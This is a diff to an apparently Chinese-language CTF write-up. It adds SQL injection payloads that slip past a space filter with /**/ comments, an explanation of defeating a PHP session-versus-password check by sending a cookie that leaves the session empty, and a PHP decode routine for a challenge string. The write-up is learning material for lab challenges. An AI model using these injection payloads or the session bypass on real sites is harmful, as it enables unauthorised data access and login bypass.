@@ -500,9 +500,11 @@ mysql_close($con);
 ?id=0'||''=' # 回显正常，利用fuzz测试，是否还存在其他字符被过滤
 ```
 select ) 空格 + 被过滤
+```
 空格我直接利用了/**/来绕过，然后这边有个巨坑无法不地方，我始终想不明白
-`?id=0'/**/union/**/select/**/1%23`这样的语句能被执行了，但是单单输入select居然被过滤
-继续测试发现`?id=/**/select/**/`这样同样select不会被过滤。同样`)`也能这样绕过。很奇怪里面的检测规则
+?id=0'/**/union/**/select/**/1%23   这样的语句能被执行了，但是单单输入select居然被过滤
+继续测试发现 ?id=/**/select/**/ 这样同样select不会被过滤。同样 ) 也能这样绕过。很奇怪里面的检测规则
+```
 如果这样接下来就很好做了
 ```sql
 ?id=0'/**/order/**/by/**/2%23  #' 报错
@@ -823,6 +825,10 @@ if (isset ($_GET['password'])) {
 
 mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));
 ```
+需要Session和password相等,Session的内容是存储在服务端的，怎么判断你存在的是哪个session又是根据你的cookie
+你传入的cookie来查找你的session值。
+所以我们可以控制传入的Cookie，来让服务端的Session获取值为空。只需要虽然该一下Session的内容，让服务器找不到对应的Session值
+在传入password参数也为空。两者就想同了。
 
 
 <br>
@@ -895,7 +901,20 @@ function encode($str){
 }
 ```
 ```php
+function decode($str){
+  $_ = base64_decode(strrev(str_rot13($str)));
+  for ($i=0; $i < (strlen($_)); $i++) {
+    $a = substr($_, $i, 1);
+    $__ = ord($a);
+    $a = chr($__ - 1);
+    $temp = $temp.$a;
+  }
+  return strrev($temp);
 
+}
+
+$str = "a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws";
+var_dump(decode($str));
 ```
 <br>
 
